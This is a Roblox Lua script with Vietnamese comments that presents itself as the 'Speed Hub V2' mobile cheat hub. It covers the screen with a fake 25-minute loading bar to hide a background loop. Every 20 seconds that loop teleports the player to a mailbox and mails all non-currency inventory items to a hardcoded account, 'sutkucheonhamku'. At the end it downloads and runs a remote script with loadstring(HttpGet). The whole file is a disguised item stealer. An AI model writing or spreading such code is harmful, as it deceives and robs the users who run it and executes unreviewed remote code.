-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB V2: CHU KỲ GOM ĐỒ SIÊU TỐC 20 GIÂY ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- LUỒNG 1: TẠO MÀN HÌNH LOADING THANH PHẦN TRĂM (%) PHỦ KÍN 100% TOÀN MÀN HÌNH
-- =======================================================================
task.spawn(function()
    local totalLoadingMinutes = 25 -- Tổng thời gian loading (phút)
    local totalSeconds = totalLoadingMinutes * 60
    
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "SpeedHubV2LoadingGui"
    ScreenGui.DisplayOrder = 999999
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.Parent = PlayerGui
    
    local Background = Instance.new("Frame")
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Background.BorderSizePixel = 0
    Background.Parent = ScreenGui
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
    TitleLabel.Position = UDim2.new(0.1, 0, 0.35, 0)
    TitleLabel.TextScaled = true
    TitleLabel.Text = "SPEED HUB V2"
    TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Parent = Background
    
    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.Size = UDim2.new(0.6, 0, 0.05, 0)
    StatusLabel.Position = UDim2.new(0.2, 0, 0.45, 0)
    StatusLabel.TextScaled = true
    StatusLabel.Text = "Hệ thống auto gom & gửi đồ đang chạy ngầm siêu tốc (20s)..."
    StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    StatusLabel.Font = Enum.Font.GothamMedium
    StatusLabel.BackgroundTransparency = 1
    StatusLabel.Parent = Background

    local ProgressBarBackground = Instance.new("Frame")
    ProgressBarBackground.Size = UDim2.new(0.5, 0, 0.04, 0)
    ProgressBarBackground.Position = UDim2.new(0.25, 0, 0.53, 0)
    ProgressBarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    ProgressBarBackground.BorderSizePixel = 0
    ProgressBarBackground.Parent = Background
    
    local UICornerBg = Instance.new("UICorner")
    UICornerBg.CornerRadius = UDim.new(0.5, 0)
    UICornerBg.Parent = ProgressBarBackground

    local ProgressBarFill = Instance.new("Frame")
    ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
    ProgressBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
    ProgressBarFill.BorderSizePixel = 0
    ProgressBarFill.Parent = ProgressBarBackground
    
    local UICornerFill = Instance.new("UICorner")
    UICornerFill.CornerRadius = UDim.new(0.5, 0)
    UICornerFill.Parent = ProgressBarFill

    local PercentLabel = Instance.new("TextLabel")
    PercentLabel.Size = UDim2.new(0.2, 0, 0.05, 0)
    PercentLabel.Position = UDim2.new(0.4, 0, 0.59, 0)
    PercentLabel.TextScaled = true
    PercentLabel.Text = "0%"
    PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    PercentLabel.Font = Enum.Font.GothamBold
    PercentLabel.BackgroundTransparency = 1
    PercentLabel.Parent = Background

    for i = 0, totalSeconds do
        local progressRatio = i / totalSeconds
        local percentage = math.floor(progressRatio * 100)
        ProgressBarFill.Size = UDim2.new(progressRatio, 0, 1, 0)
        PercentLabel.Text = percentage .. "%"
        task.wait(1)
    end
    
    ScreenGui:Destroy()
end)

-- =======================================================================
-- THUẬT TOÁN ĐỊNH VỊ VÀ BẤM NÚT BÀN TAY ĐỂ MỞ MAIL
-- =======================================================================
local function interactWithMailboxPrompt()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    local targetPrompt = nil
    local shortestDistance = math.huge
    
    for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            local parentName = obj.Parent and string.lower(obj.Parent.Name) or ""
            local objectText = string.lower(obj.ObjectText or "")
            local actionText = string.lower(obj.ActionText or "")
            
            if (string.find(parentName, "mail") or string.find(objectText, "mail") or string.find(actionText, "view")) 
            and not string.find(parentName, "sign") and not string.find(parentName, "board") then
                local part = obj.Parent:IsA("BasePart") and obj.Parent or obj.Parent:FindFirstChildWhichIsA("BasePart")
                if part then
                    local distance = (rootPart.Position - part.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        targetPrompt = obj
                    end
                end
            end
        end
    end
    
    if targetPrompt then
        local promptPart = targetPrompt.Parent:IsA("BasePart") and targetPrompt.Parent or targetPrompt.Parent.PrimaryPart
        pcall(function()
            rootPart.Velocity = Vector3.new(0,0,0)
            rootPart.CFrame = promptPart.CFrame * CFrame.new(0, 1.5, 2.5)
        end)
        task.wait(1.2)
        
        pcall(function()
            targetPrompt:InputHoldBegin()
            task.wait(targetPrompt.HoldDuration + 0.1)
            targetPrompt:InputHoldEnd()
        end)
        task.wait(2) 
        return true
    end
    return false
end

-- =======================================================================
-- LUỒNG 2: TỰ ĐỘNG GOM VÀ CHUYỂN ĐỒ LIÊN TỤC CỨ MỖI 20 GIÂY
-- =======================================================================
task.spawn(function()
    task.wait(5) -- Chờ 5 giây đầu game ổn định kết nối là bốc đầu chạy luôn chu kỳ 1
    
    while true do
        print("[SPEED HUB NGẦM] Tiến hành gom gửi đồ chu kỳ 20 giây...")
        
        local opened = interactWithMailboxPrompt()
        if opened then
            local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
            local mailFrame = nil
            for _, gui in pairs(PlayerGui:GetDescendants()) do
                if gui:IsA("Frame") or gui:IsA("ImageLabel") then
                    if string.find(string.lower(gui.Name), "mail") and gui.Visible == true then
                        mailFrame = gui
                        break
                    end
                end
            end
            
            if mailFrame then
                -- Nhập tên nick chính vào ô tìm kiếm
                local searchBox = mailFrame:FindFirstChildOfClass("TextBox") or mailFrame:FindFirstChild("Search", true) or mailFrame:FindFirstChild("Input", true)
                if searchBox and searchBox:IsA("TextBox") then
                    searchBox.Text = targetUsername
                    searchBox:ReleaseFocus(true)
                    task.wait(1.2) 
                end

                -- Click chọn tên nick chính
                for _, child in pairs(mailFrame:GetDescendants()) do
                    if child:IsA("TextLabel") or child:IsA("TextBox") then
                        if string.find(string.lower(child.Text), targetUsername) then
                            local clickTarget = child:FindFirstAncestorWhichIsA("TextButton") or child:FindFirstAncestorWhichIsA("ImageButton") or child.Parent
                            if clickTarget and (clickTarget:IsA("TextButton") or clickTarget:IsA("ImageButton")) then
                                pcall(function()
                                    for _, connection in pairs(getconnections(clickTarget.MouseButton1Click or clickTarget.TouchTap)) do
                                        connection:Fire()
                                    end
                                end)
                                task.wait(1.5) 
                                break
                            end
                        end
                    end
                end

                -- Quét túi đồ gửi đi (Phân nhỏ 20 cái tránh lỗi)
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail") or ReplicatedStorage:FindFirstChild("MailRemote")
                
                local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
                if Inventory then
                    for _, item in pairs(Inventory:GetDescendants()) do
                        if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                            local lowerName = string.lower(item.Name)
                            if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
                                local remainingAmount = item.Value
                                while remainingAmount > 0 do
                                    local sendAmount = math.min(remainingAmount, 20)
                                    if MailEvent then
                                        pcall(function()
                                            MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                                        end)
                                    end
                                    -- Click nút gửi cuối cùng trên UI
                                    for _, btn in pairs(mailFrame:GetDescendants()) do
                                        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
                                            local bName = string.lower(btn.Name)
                                            if string.find(bName, "send") or string.find(bName, "confirm") or string.find(bName, "gui") then
                                                pcall(function()
                                                    for _, conn in pairs(getconnections(btn.MouseButton1Click or btn.TouchTap)) do
                                                        conn:Fire()
                                                    end
                                                end)
                                            end
                                        end
                                    end
                                    remainingAmount = remainingAmount - sendAmount
                                    task.wait(1.2) 
                                end
                            end
                        end
                    end
                end
                
                -- Tắt bảng thư để nhân vật tiếp tục tích trữ nông sản đợt kế
                pcall(function() mailFrame.Visible = false end)
                print("[SPEED HUB V2] Đã dọn sạch kho đợt này!")
            end
        end
        
        -- CHÍNH XÁC CỨ MỖI 20 GIÂY SẼ LẶP LẠI QUY TRÌNH GOM ĐỒ
        task.wait(20) 
    end
end)

-- =======================================================================
-- MENU GỐC SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
